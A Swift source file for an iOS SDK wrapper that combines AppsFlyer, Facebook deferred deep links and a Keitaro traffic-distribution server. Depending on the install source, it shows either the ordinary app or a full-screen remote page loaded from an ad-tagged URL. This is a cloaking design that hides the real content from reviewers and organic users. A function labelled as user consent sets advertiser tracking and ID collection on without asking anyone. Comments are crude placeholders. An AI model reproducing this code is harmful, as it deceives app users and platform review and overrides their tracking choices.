import SwiftUI
import UIKit
import FacebookCore
import AppsFlyerLib
import AdSupport
import AppTrackingTransparency
#if canImport(GoogleMobileAds)
import GoogleMobileAds
#endif
public struct OliLibrary {
    private(set) var appDelegate: AppDelegate = AppDelegate()
    
    @discardableResult public init(AppsFlyerId: String, Keitaro: String, KeitaroId: String, Privacy: String, commonView: UIViewController) {
        LaunchAppProperties.fill(AppsFlyerId: AppsFlyerId, Keitaro: Keitaro, KeitaroId: KeitaroId)
        SettingsScenesPrivate.global.url = Privacy
        AppDelegate.commonView = commonView
    }
}

 class AppDelegate: UIResponder, UIApplicationDelegate {
    
//MARK: - Properties
    static var commonView: UIViewController = UIViewController()
    public var window: UIWindow?
    var loadTime: Date? = Date()
    var params: String = ""
    var oliParams: String!
    var keys: [String: String] = ["af_sub1" : "af_sub1" ,
                                  "af_sub2" : "af_sub2",
                                  "af_sub3" : "af_sub3",
                                  "af_sub4" : "af_sub4",
                                  "af_sub5" : "af_sub5",
                                  "af_ad_id" : "af_ad_id",
                                  "af_ad" : "af_ad",
                                  "af_adset" : "af_adset",
                                  "af_adset_id" : "af_adset_id",
                                  "af_site_id" : "af_site_id",
                                  "af_siteid" : "af_siteid",
                                  "ompixel" : "sub17",
                                  "clickid" : "sub18",
                                  "fbclid" : "fbclid",
                                  "agency" : "agency",
                                  "media_source" : "media_source",
                                  "http_referrer" : "http_referrer"]
    
    private let myGroup = DispatchGroup()
    private var queue = DispatchQueue(label: "my.Network",
                                      qos: .default, attributes: .concurrent)
    
// MARK: - AppDelegate Methods
    public func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        checkRoute()
        initAppsFlyer(isDebug: false)
        initFB(for: application, launchOptions: launchOptions)
        NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("sendLaunch"), name: UIApplication.didBecomeActiveNotification, object: nil)
//        launchView()
        
        return true
    }
    
    @objc func sendLaunch() {
        AppsFlyerLib.shared().start()
#if canImport(GoogleMobileAds)
        GADMobileAds.sharedInstance().start(completionHandler: nil)

#endif
    }
    
    func checkRoute() {
        let paramsURL = "\(LaunchAppProperties.Keitaro)\(LaunchAppProperties.KeitaroId)?route=true" // сюда нужно послать запрос и в переменную
        let requestURL = URL(string: paramsURL)!
        URLSession.shared.dataTask(with: requestURL) {(data, response, error) in
            guard let data = data else { return }
            let text = String(data: data, encoding: .utf8)!
            debugPrint("ROUTE: \(text)")
            UserDefaultsManager.shared.setRoute(to: text)
        }.resume()
    }
    

  
// MARK: - IDFA
    /**
        Generates IDFA String
     
        **If iOS is lower than 14.0:**
        * Method ``identifierForAdvertising()`` is called
        
        **Status switch cases (available for iOS 14.0+):**
     
        * **authorized** - Tracking authorization dialog was shown and we are authorized;
        * **denied** - Tracking authorization dialog was shown and permission is denied;
        * **notDetermined** - Tracking authorization dialog has not been shown;
        * **restricted** - Restricted;
        * **@unknown default**
     
        - Returns: UUID String from **ASIdentifierManager.shared().advertisingIdentifier.uuidString**
    */
    func requestPermissionAndIDFA(completion: @escaping (_ IDFA: String) -> () ) {
        var IDFA = ""
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { status in
                switch status {
                case .authorized:
                    IDFA = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    completion(IDFA)
                case .denied:
                    completion(IDFA)
                case .notDetermined:
                    completion(IDFA)
                case .restricted:
                    print("Restricted")
                    completion(IDFA)
                @unknown default:
                    print("Unknown")
                }
            }
        } else {
            IDFA = identifierForAdvertising()
            completion(IDFA)
        }
    }
    
    /**
        Method to return ID for ads

        If ad tracking is disabled - method will return empty string
        - Returns: UUID String from **ASIdentifierManager.shared().advertisingIdentifier.uuidString**
    */
    func identifierForAdvertising() -> String {
        guard ATTrackingManager.trackingAuthorizationStatus == .authorized else {
            return ""
        }
        return ASIdentifierManager.shared().advertisingIdentifier.uuidString
    }
    
// MARK: - Params Completion
    private func completeParams(conversionInfo: [AnyHashable : Any], completion: () -> ()) {
        keys.forEach { key,value in
            if let param = conversionInfo[key] as? String, param != "<null>" {
                params += "&\(value)=\(param)"
                if key == "ompixel"{
                    params += "&sub_16=tt"
                } else if key == "fbclid"{
                    params += "&sub_16=fb"
                }
            }
        }
        completion()
    }
    
    private func completeOliParams(idfa: String, completion: () -> ()) {
        oliParams = "&sub5=\(idfa)&appsflyer=\(AppsFlyerLib.shared().getAppsFlyerUID())"
        completion()
        
    }
}

//MARK: - Check links & Set preferences
extension AppDelegate {
    private func readingPreferenceFromUserDefaults() {
        if let preference = UserDefaultsManager.shared.preference {
            switch preference {
            case .CommonContent:
                self.commonVC()
            case .PrivateContent:
                openPrivateVC(modalPresentationStyle: .fullScreen)
            }
        } else {
            checkLinksAndSetPreference()
        }
    }
    
    private func checkLinksAndSetPreference() {
        fetchDefferedLinkFromFB { changedDeeplink in
            if let changedDeeplink = changedDeeplink {
                self.createAndSaveUrlFromFB(for: changedDeeplink)
                UserDefaultsManager.shared.preference = .PrivateContent
            } else if self.isKeitaroResponse() {
                UserDefaultsManager.shared.preference = .PrivateContent
            } else {
                UserDefaultsManager.shared.preference = .CommonContent
            }
        }
    }
    
    private func isKeitaroResponse() -> Bool {
        var isResponsed = false
        
        myGroup.enter()
        queue.async {
            Requester.instance.fetchData(url: "\(LaunchAppProperties.Keitaro)" + "\(LaunchAppProperties.KeitaroId)") { object, error in
                if object == nil || object?.string == "" || error != nil {
                    isResponsed = false
                } else {
                    isResponsed = true
                    self.createAndSaveUrlFromKeitaro()
                }
                self.myGroup.leave()
            }
        }
        
        myGroup.wait()
        return isResponsed
    }

// MARK: - Keitaro & FB URLs
    /**
         Creates Facebook URL and saves it UserDefaults. Then opens PrivacyViewController
     
         1. здесь должен быть кал про создание ссылки
         2. Saved to UserDefaults via ``UserDefaultsManager``
         3. Opens PrivacyViewController via ``openPrivateVC(modalPresentationStyle: .fullScreen)``
     
         - Parameters:
            - changedDeeplink: не ебу че это
    */
    private func createAndSaveUrlFromFB(for changedDeeplink: String) {
        let url = "\(LaunchAppProperties.Tds)\(changedDeeplink)\(params)\(oliParams ?? "")"
        UserDefaultsManager.shared.setUrl(to: url)
        openPrivateVC(modalPresentationStyle: .fullScreen)
    }
    
    /**
        Method that creates a URL String for Keitaro

        This method uses 4 properties to build the URL to return:

        * LaunchAppProperties.Keitaro - Keitaro link (should be taken from link)
        * LaunchAppProperties.KeitaroId - Keitaro ID (should be taken from link)
        * params - хуй знает че это пока что, позже допишу
        * oliParams *(force unwrapped optional)* - хуй знает че это пока что, позже допишу
     
        - Returns: String which contains URL
     */
    private func createKeitaroUrl() -> String {
        return "\(LaunchAppProperties.Keitaro)\(LaunchAppProperties.KeitaroId)?\(params)\(oliParams ?? "")"
    }
    
    /**
        Creates Keitaro URL and saves it UserDefaults. Then opens PrivacyViewController
     
        1. Uses ``createKeitaroUrl()`` to generate the URL
        2. Saved to UserDefaults via ``UserDefaultsManager``
        3. Opens PrivacyViewController via ``openPrivateVC(modalPresentationStyle: .fullScreen)``
    */
    private func createAndSaveUrlFromKeitaro() {
        let url = createKeitaroUrl()
        UserDefaultsManager.shared.setUrl(to: url)
        openPrivateVC(modalPresentationStyle: .fullScreen)
    }
    
}
//MARK: - Launch
extension AppDelegate {
    
    /**
        Method to open ``PrivacyViewController``
     
        - Parameters:
           - modalPresentationStyle: ViewController's presentation style
    */
    func openPrivateVC(modalPresentationStyle: UIModalPresentationStyle) {
        DispatchQueue.main.async {
            let privacyVC: UIViewController = PrivacyViewController(nibName: nil, bundle: nil)
            privacyVC.modalPresentationStyle = modalPresentationStyle
            UIApplication.shared.keyWindow?.rootViewController?.present(privacyVC, animated: modalPresentationStyle == .fullScreen ? false : true)
        }
    }
    
    /**
        Method to launch app's main screen
        Just sets up the ``UIWindow`` for the app and sets it's rootViewController to ``MainViewController``
    */
    func commonVC() {
        UIApplication.shared.keyWindow?.rootViewController = AppDelegate.commonView
    }
    
    /**
        
     */
    func launchView() {
        UIApplication.shared.keyWindow?.rootViewController = UIHostingController(rootView: LaunchView())
    }
}

//MARK: - Facebook
extension AppDelegate {

    public func application( _ app: UIApplication,
                      open url: URL,
                      options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        ApplicationDelegate.shared.application(
            app,
            open: url,
            sourceApplication: options[UIApplication.OpenURLOptionsKey.sourceApplication] as? String,
            annotation: options[UIApplication.OpenURLOptionsKey.annotation]
        )
    }
    
    /**
        Calls Application setup for Facebook SDK
    */
    func initFB(for application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
        ApplicationDelegate.shared.application(
            application,
            didFinishLaunchingWithOptions: launchOptions
        )
    }
    
    /**
        Settings setup for Facebook SDK
     
        * ``isAutoLogAppEventsEnabled`` --> **true**
        * ``isAdvertiserTrackingEnabled`` --> **true**
        * ``isAdvertiserIDCollectionEnabled`` --> **true**
    */
    func getUserConsentFromFB() {
        Settings.shared.isAutoLogAppEventsEnabled = true
        Settings.shared.isAdvertiserTrackingEnabled = true
        Settings.shared.isAdvertiserIDCollectionEnabled = true
    }
    
    private func fetchDefferedLinkFromFB(completion: @escaping (_ recievedDeeplink: String?) -> ()) {
        getUserConsentFromFB()
        AppLinkUtility.fetchDeferredAppLink { (url, error) in
            
            if let error = error {
                print("Received error while fetching deferred app link %@", error)
            }
            
            if url == nil {
                print("Deeplink response: \(String(describing: url))")
                UIApplication.shared.keyWindow?.rootViewController = AppDelegate.commonView
                completion(nil)
                return
            }
            
            if let url = url {
                
                var croppedLink = url.absoluteString
                if let range = croppedLink.range(of: "!") {
                    croppedLink = String(croppedLink[range.upperBound...])
                }
                
                //TODO: - croppedLink
                print("%fetch deeplinkFB: \(url.absoluteString)")
                print("%fetch croppedLink: \(croppedLink)")
                completion(croppedLink)
            }
        }
    }
}

//MARK: - AppsFlyer
extension AppDelegate: AppsFlyerLibDelegate {
    
    private func initAppsFlyer(isDebug: Bool) {
        AppsFlyerLib.shared().appsFlyerDevKey = LaunchAppProperties.AppsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = LaunchAppProperties.AppsFlyerId
        AppsFlyerLib.shared().isDebug = isDebug
        AppsFlyerLib.shared().delegate = self
    }
    
    public func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("onConversionDataSuccess data: ")
        dump(data)
        for (key, value) in data {
            print(key, ":", value)
            print("### data = \(data)")
        }
        if let status = data["af_status"] as? String {
            print("### af_status = \(status)")
            
            if (status == "Non-organic") {
                if let sourceID = data["media_source"],
                   let campaign = data["campaign"] {
                    print("This is a Non-Organic install. Media source: \(sourceID)  Campaign: \(campaign)")
                }
            }
            if let is_first_launch = data["is_first_launch"] as? Bool,
               is_first_launch {
                print("First Launch")
            }
            
        }
        
        if let idfa = data["idfa"] as? String {
            
            self.myGroup.enter()
            DispatchQueue.main.async {
                self.completeParams(conversionInfo: data) {
                    self.myGroup.leave()
                }
            }
            
            self.myGroup.enter()
            DispatchQueue.main.async {
                self.completeOliParams(idfa: idfa) {
                    self.myGroup.leave()
                }
            }
            
            self.myGroup.notify(queue: DispatchQueue.main) {
                self.readingPreferenceFromUserDefaults()
            }
            
        } else {
            self.requestPermissionAndIDFA { IDFA in
                
                self.myGroup.enter()
                DispatchQueue.main.async {
                    self.completeParams(conversionInfo: data) {
                        self.myGroup.leave()
                    }
                }
                self.myGroup.enter()
                DispatchQueue.main.async {
                    self.completeOliParams(idfa: IDFA) {
                        self.myGroup.leave()
                    }
                }
                self.myGroup.notify(queue: DispatchQueue.main) {
                    self.readingPreferenceFromUserDefaults()
                }
                
            }
        }
        
    } //-- end func onConversionDataSuccess()
    
    public func onConversionDataFail(_ error: Error) {
        self.commonVC()
        requestPermissionAndIDFA { _ in }
    }
}

extension UIApplication {
    
    var keyWindow: UIWindow? {
        return UIApplication.shared.connectedScenes
            .filter { $0.activationState == .foregroundActive }
            .first(where: { $0 is UIWindowScene })
            .flatMap({ $0 as? UIWindowScene })?.windows
            .first(where: \.isKeyWindow)
    }
    
    class func getTopVC(base: UIViewController?
                        = UIApplication.shared.keyWindow?.rootViewController) -> UIViewController? {
        
        if let presented = base?.presentedViewController {
            return getTopVC(base: presented)
        }
        return base
    }
}

extension UIApplication {
    func endEditing() {
        sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil)
    }
}
